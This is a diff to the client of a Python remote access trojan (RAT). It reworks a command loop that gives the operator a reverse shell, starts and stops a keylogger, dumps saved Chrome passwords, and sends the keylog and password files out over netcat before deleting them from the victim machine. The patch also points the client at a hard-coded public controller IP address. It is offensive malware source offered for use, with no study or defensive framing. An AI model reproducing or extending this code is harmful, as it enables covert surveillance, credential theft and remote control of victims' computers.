@@ -3,8 +3,6 @@ from rev_shell import Shell
 import socket
 from chrome_passwords import ChromePass
 from keylogger import KeyLogger
-from time import sleep
-import subprocess
 import os
 
 
@@ -58,41 +56,47 @@ class Client:
         2. Starts logging key events to file
         3. Gets a reverse shell from client to server
         """
+        
+        while 1:
+            
+            # Try connection with Ctrl-C handling
+            try:
+                choice = self.open_menu()
+            except (ConnectionResetError, ConnectionAbortedError, ConnectionError, ConnectionAbortedError):
+                self.sock.close()
+                break
 
-        choice = self.open_menu()
+            if choice == 1:
+                self.shell.get_shell()
 
-        if choice == 1:
-            self.shell.get_shell()
+            elif choice == 2:
+                self.keylogger.start_log()
+                self.send_data("\n\nKey logging started to file '{}'...".format(self.keylog_filename), self.sock)
 
-        elif choice == 2:
-            self.keylogger.start_log()
-            self.send_data("\n\nKey logging started to file '{}'...".format(self.keylog_filename), self.sock)
+            elif choice == 3:
+                self.keylogger.end_log()
+                self.send_data("\n\nKey logging stopped...", self.sock)
 
-        elif choice == 3:
-            self.keylogger.end_log()
-            self.send_data("\n\nKey logging stopped...", self.sock)
+            elif choice == 4:
+                self.chrome_pass.get_chrome_pass()
+                self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename), self.sock)
 
-        elif choice == 4:
-            self.chrome_pass.get_chrome_pass()
-            self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename), self.sock)
+            elif choice == 5:
+                # ToDo
+                pass
 
-        elif choice == 5:
-            # ToDo
-            pass
+            elif choice == 6:
+                # ToDo
+                pass
 
-        elif choice == 6:
-            # ToDo
-            pass
+            elif choice == 7:
+                self.send_file(self.keylog_filename)
+                self.send_data("\n\n{} sent and deleted from client...".format(self.keylog_filename), self.sock)
 
-        elif choice == 7:
-            self.send_file(self.keylog_filename)
-            self.send_data("\n\n{} sent and deleted from client...".format(self.keylog_filename), self.sock)
-
-        elif choice == 8:
-            self.send_file(self.chromepass_filename)
-            self.send_data("\n\n{} sent and deleted from client...".format(self.chromepass_filename), self.sock)
-
-        self.run()
+            elif choice == 8:
+                self.send_file(self.chromepass_filename)
+                self.send_data("\n\n{} sent and deleted from client...".format(self.chromepass_filename), self.sock)
+            
 
     def open_menu(self) -> int:
         """
@@ -100,11 +104,11 @@ class Client:
         
         :returns: The choice of the menu
         """
-
+        
         response = ""
 
         # Opens menu
-        menu_str = "\n\n\n\nPlease select one of the functionalities from the following menu: \n \n \
+        menu_str = "\nPlease select one of the functionalities from the following menu: \n \n \
             1) Get a reverse shell \n \
             2) Start keylogger \n \
             3) Stop keylogger \n \
@@ -129,7 +133,6 @@ class Client:
         # Check valid response
         if response not in [1, 2, 3, 4, 5, 6, 7, 8]:
             self.send_data("\nNot a valid response!\n", self.sock)
-            sleep(2)
             self.open_menu()
 
         return response
@@ -151,12 +154,10 @@ class Client:
 
         :returns: The received data
         """
-
-        data = ""
+                
         # Wait until data is received
-        while data == "":
-            data = sock.recv(1024).decode("UTF-8")
-
+        data = sock.recv(1024).decode("UTF-8") 
+            
         return data
 
     def send_file(self, filename: str) -> None:
@@ -165,7 +166,7 @@ class Client:
 
         # Instructions
         self.send_data(f"\nTo receive file {filename}: \n \
-        run command in another terminal:\n\n \
+        run command in another terminal:\n \
         nc -l -p {self.file_port} > {filename} \n", self.sock)
 
         # Wait for enter press
@@ -196,4 +197,4 @@ class Client:
 if __name__ == "__main__":
     # Run RAT with specified IP and port continuously
     while 1:
-        Client("192.168.178.92").run()
+        Client("131.155.204.207").run()
